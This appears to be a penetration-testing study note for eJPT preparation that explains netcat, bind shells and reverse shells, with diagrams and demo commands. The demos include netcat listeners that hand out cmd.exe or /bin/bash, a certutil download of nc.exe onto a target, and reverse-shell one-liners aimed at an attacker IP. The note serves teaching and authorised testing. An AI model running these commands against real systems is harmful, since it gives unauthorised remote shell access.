# 43 Bind & Reverse Shells

# Netcat Fundamentals

- Netcat (AKA TCP/IP Swiss Army Knife) is a networking utility used to read and write data to network connections using TCP or UDP
- Netcat is available for both \*NIX and Windows operating systems, consequently making it extremely useful for cross-platform engagements
- Netcat utilizes a client-server communication architecture with two modes:
	- Client mode
		- Used in client mode to connect to any TCP/UDP port as well as a Netcat listener (server)
	- Server mode
		- Used to listen for connections from clients on a specific port
- Netcat can be used by penetration testers to perform the following functionality:
	- Banner Grabbing
	- Port Scanning
	- Transferring Files
	- Bind/Reverse Shells

### DEMO

```shell
nc <ip> <port>
nc -n # No DNS resolution
nc -u # UDP
nc -l # Listen
nc -e # Execute a program, typically a shell

# TCP connection
nc -nvlp # Setup listener. No DNS, Verbose, Listen, Port
nc -nv <ip> <port> # Connect to a listener

# UDP connection
nc -nvlup # UDP listener
nc -nvu <ip> <port> # Connect to a listener

# Transfer files
# Who receive the file have to setup a listener
nc -nvlp <port> > <file> # Who receive the file
nc -nv <ip> <port> < <file> # Who send the file
```


# Bind Shells

- A bind shell is a type of remote shell where the attacker connects directly to a listener of the target system, consequently allowing for execution of commands on the target system
- A netcat listener can be setup to execute a specific executable like cmd.exe or /bin/bash when a client connects to the listener

```
+------------------------+                       +-----------------------+
|       Attacker         |                       |        Target         |
|   (Netcat Client)      | ----- BIND SHELL ---> |   (Netcat Listener)   |
+------------------------+                       +-----------------------+

# Attacker connects to Netcat listener on target
```

### DEMO

```shell
/usr/share/windows-binaries # Where nc is stored
python -m SimpleHTTPServer 80 # Setup a server 

# In target machine, in this case Windows
certutil -urlcache -split -f "http://example.com/files/nc.exe" # Download in WIN
nc.exe -nvlp <port> -e cmd.exe # Setup listener
# If target it's Linux system
nc -nvlp <port> -c /bin/bash # Setup listener

# In attacker machine
nc -nv <ip-target> <port-target> # Connect to listener
```


# Reverse Shells

- A reverse shell is a type of remote shell where the target connects directly to a listener on the attacker's system, consequently allowing for execution of commands on the target system

```
+------------------------+                         +-----------------------+
|       Attacker         |                         |        Target         |
|   (Netcat Listener)    | <---- REVERSE SHELL --- |   (Netcat Client)     |
+------------------------+                         +-----------------------+

# Target connects to a Netcat listener on Attacker system
```

### DEMO

```shell
# CONS: Attacker IP needs to be available on the target system

# Attacker machine
nc -nvlp <port>

# Target machine
nc.exe -nv <ip-attacker> <port> -e cmd.exe # Windows target
# Or
nc -nv <ip-attacker> <port> -c /bin/bash # Linux target
```


# Reverse Shell Cheatsheet

### NOTES

- [swisskyrepo - Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
- https://www.revshells.com/

#eJPT #cybersecurity 